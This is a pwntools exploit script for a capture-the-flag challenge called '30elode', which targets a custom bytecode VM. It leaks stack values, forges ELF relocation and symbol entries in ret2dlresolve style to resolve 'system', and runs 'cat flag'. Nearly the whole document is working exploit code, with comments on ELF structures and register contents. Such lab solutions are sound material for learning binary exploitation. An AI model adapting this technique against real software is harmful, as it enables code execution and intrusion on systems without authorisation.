#!/usr/bin/env python3

from enum import Enum
from pwn import *

elf = ELF("./30elode_patched")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote('30elode.challs.olicyber.it', 38301)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b *vm+136 
                                b *vm+199 
                                commands 1
                                    x/18gx &regs
                                    stack 50
                                    end
                                    
                                ignore 1 100
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

from enum import Enum

class Opcode(Enum):
    ADD = 0
    SUB = 1
    MUL = 2
    DIV = 3
    AND = 4
    OR  = 5
    XOR = 6
    SHL = 7
    SHR = 8
    PUSH = 9
    POP  = 10
    MOV  = 11
    PUSHA = 12
    POPA  = 13
    MOVIMM16 = 14
    
def craft(opcode: Opcode, dest: int = 0, source: int = 0, 
                    push_reg: bool = True, amount: int = 8, value: int = 0) -> bytes:
    
    operation = [opcode.value, 0, 0, 0]

    if opcode == Opcode.MOVIMM16:
        operation[1] = value & 0xff
        operation[2] = (value >> 8) & 0xff
        operation[3] = dest
        
    elif opcode == Opcode.PUSH:
        if push_reg:
            # push register
            operation[1] = 2
            operation[2] = source
        elif amount == 2:
            # push 16-bit immediate
            operation[1] = 1
            operation[2] = value & 0xff
            operation[3] = (value >> 8) & 0xff
        elif amount == 1:
            # push 8-bit immediate
            operation[1] = 0
            operation[2] = value & 0xff
        else:
            raise Exception("invalid amount for push operation")
            
    elif opcode in (Opcode.PUSHA, Opcode.POPA):
        return bytes(operation)
        
    elif opcode == Opcode.POP:
        operation[1] = dest
        
    else:
        # High 4 bits are dest, low 4 bits are source
        operation[1] = (dest << 4) | source
    
    return bytes(operation)
        
def main():
    r = conn()

    payload = craft(Opcode.POPA) \
            + craft(Opcode.MOVIMM16, 2, value=0x10) \
            + craft(Opcode.MOVIMM16, 6, value=int.from_bytes(b'sy', byteorder='little')) \
            + craft(Opcode.MOVIMM16, 1, value=int.from_bytes(b'st', byteorder='little')) \
            + craft(Opcode.MOVIMM16, 15, value=int.from_bytes(b'em', byteorder='little')) \
            + craft(Opcode.SHL, 1, 2) \
            + craft(Opcode.SHL, 15, 2) \
            + craft(Opcode.SHL, 15, 2) \
            + craft(Opcode.XOR, 6, 1) \
            + craft(Opcode.XOR, 6, 15) \
            \
            + craft(Opcode.MOVIMM16, 0, value=elf.got['puts']) \
            + craft(Opcode.MOVIMM16, 1, value=(elf.sym.regs+0x18 - elf.get_section_by_name('.dynsym').header.sh_addr)//0x18) \
            + craft(Opcode.MOVIMM16, 4, value=0x20) \
            + craft(Opcode.SHL, 1, 4) \
            + craft(Opcode.MOVIMM16, 4, value=0x7) \
            + craft(Opcode.XOR, 1, 4) \
            + craft(Opcode.XOR, 2, 2) \
            \
            + craft(Opcode.MOVIMM16, 3, value=(elf.sym.regs + 0x18*2 - elf.get_section_by_name('.dynstr').header.sh_addr)) \
            + craft(Opcode.XOR, 4, 4) \
            + craft(Opcode.XOR, 5, 5) \
            \
            + craft(Opcode.MOVIMM16, 11, value=(elf.sym.regs - elf.get_section_by_name('.rela.plt').header.sh_addr)// 0x18) \
            + craft(Opcode.MOVIMM16, 7, value=(elf.sym.child+172) ^ (elf.get_section_by_name('.plt').header.sh_addr+0x29)) \
            + craft(Opcode.XOR, 12, 7) \
            \
            + craft(Opcode.PUSHA) \
            + b'cat flag >&2'
    
    # .rela.plt is composed of this entries (0x18 bytes long)
    # typedef struct {
    #     Elf64_Addr r_offset;
    #     uint64_t   r_info;
    #     int64_t    r_addend;
    # } Elf64_Rela;
    # higher 4 bytes of r_info: index of the relative Elf64_Sym struct in .dynsym
    # lower 4 bytes of r_info:  type (7 = R_X86_64_JUMP_SLOT)
    	
    # .dynsym is composed of these entries (0x18 bytes long)
    # typedef struct {
    #     uint32_t      st_name;
    #     unsigned char st_info;
    #     unsigned char st_other;
    #     uint16_t      st_shndx;
    #     Elf64_Addr    st_value;
    #     uint64_t      st_size;
    # } Elf64_Sym;
    
    # Roba utile dopo PRIMO POPA:
    # reg[14] = canary
    # reg[13] = rbp
    # reg[12] = child+172
    # reg[6]  = canary
    # reg[5]  = rbp
    # reg[4]  = main+456
    # secondo POPA -> stringhe
    # POPA + PUSHA = write to stack
    
    r.sendlineafter(b'Code size (bytes):', str(len(payload)).encode())
    r.sendlineafter(b'Code:', payload)
    
    
    r.interactive()

if __name__ == "__main__":
    main()
